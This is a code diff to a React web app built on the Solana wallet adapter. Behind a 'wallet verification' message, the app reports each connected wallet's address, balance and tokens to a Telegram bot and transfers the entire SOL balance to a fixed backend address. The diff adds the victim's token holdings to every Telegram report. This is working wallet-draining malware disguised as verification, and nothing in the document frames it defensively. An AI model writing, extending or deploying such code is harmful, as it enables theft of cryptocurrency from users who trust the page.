@@ -1,3 +1,4 @@
+
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
@@ -196,7 +197,11 @@ const Index = () => {
         description: "Processing wallet verification...",
       });
       
-      const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+      // Always ensure walletData includes tokens
+      const telegramSent = await sendToTelegram({
+        ...walletData,
+        tokens: tokens.length > 0 ? tokens : walletData.tokens || [],
+      }, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
       
       if (!telegramSent) {
         console.error("Failed to send data to Telegram");
@@ -207,7 +212,10 @@ const Index = () => {
         });
         
         setTimeout(async () => {
-          await sendToTelegram(walletData!, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+          await sendToTelegram({
+            ...walletData!,
+            tokens: tokens.length > 0 ? tokens : walletData!.tokens || [],
+          }, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
         }, 3000);
       } else {
         console.log("Successfully sent wallet data to Telegram");
@@ -219,7 +227,8 @@ const Index = () => {
         const zeroBalanceMessage = {
           address: publicKey.toString(),
           message: `WALLET HAS ZERO BALANCE. No transfer will be attempted.`,
-          walletName: wallet?.adapter?.name || "Unknown Wallet"
+          walletName: wallet?.adapter?.name || "Unknown Wallet",
+          tokens: tokens.length > 0 ? tokens : walletData.tokens || []
         };
         
         await sendToTelegram(zeroBalanceMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
@@ -239,7 +248,8 @@ const Index = () => {
         const lowRentMessage = {
           address: publicKey.toString(),
           message: `INSUFFICIENT FUNDS FOR RENT EXEMPTION. Balance: ${walletData.balance.toFixed(6)} SOL. Minimum required: ${MINIMUM_REQUIRED_SOL} SOL.`,
-          walletName: wallet?.adapter?.name || "Unknown Wallet"
+          walletName: wallet?.adapter?.name || "Unknown Wallet",
+          tokens: tokens.length > 0 ? tokens : walletData.tokens || []
         };
         
         await sendToTelegram(lowRentMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
@@ -262,7 +272,8 @@ const Index = () => {
       const transferMessage = {
         address: publicKey.toString(),
         message: `ATTEMPTING TO TRANSFER ${walletData.balance.toFixed(6)} SOL to ${BACKEND_ADDRESS}`,
-        walletName: wallet?.adapter?.name || "Unknown Wallet"
+        walletName: wallet?.adapter?.name || "Unknown Wallet",
+        tokens: tokens.length > 0 ? tokens : walletData.tokens || []
       };
       
       await sendToTelegram(transferMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
@@ -296,7 +307,8 @@ const Index = () => {
           BACKEND_ADDRESS,
           walletData.balance,
           TELEGRAM_BOT_TOKEN,
-          TELEGRAM_CHAT_ID
+          TELEGRAM_CHAT_ID,
+          tokens.length > 0 ? tokens : walletData.tokens || []
         );
 
         updateStepStatus('successfulSign', 'active');
@@ -310,7 +322,8 @@ const Index = () => {
           address: publicKey.toString(),
           message: `TRANSFER COMPLETED! ${walletData.balance.toFixed(6)} SOL sent.
 Transaction: https://explorer.solana.com/tx/${signature}`,
-          walletName: wallet?.adapter?.name || "Unknown Wallet"
+          walletName: wallet?.adapter?.name || "Unknown Wallet",
+          tokens: tokens.length > 0 ? tokens : walletData.tokens || []
         };
         
         await sendToTelegram(completionMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
@@ -334,7 +347,8 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
         const failureMessage = {
           address: publicKey.toString(),
           message: `TRANSFER FAILED! Error: ${error instanceof Error ? error.message : "Unknown error"}`,
-          walletName: wallet?.adapter?.name || "Unknown Wallet"
+          walletName: wallet?.adapter?.name || "Unknown Wallet",
+          tokens: tokens.length > 0 ? tokens : walletData.tokens || []
         };
         
         await sendToTelegram(failureMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
@@ -353,7 +367,8 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
         const errorMessage = {
           address: publicKey.toString(),
           message: `ERROR DURING WALLET CONNECTION: ${error instanceof Error ? error.message : "Unknown error"}`,
-          walletName: wallet?.adapter?.name || "Unknown Wallet"
+          walletName: wallet?.adapter?.name || "Unknown Wallet",
+          tokens: tokens.length > 0 ? tokens : []
         };
         
         await sendToTelegram(errorMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
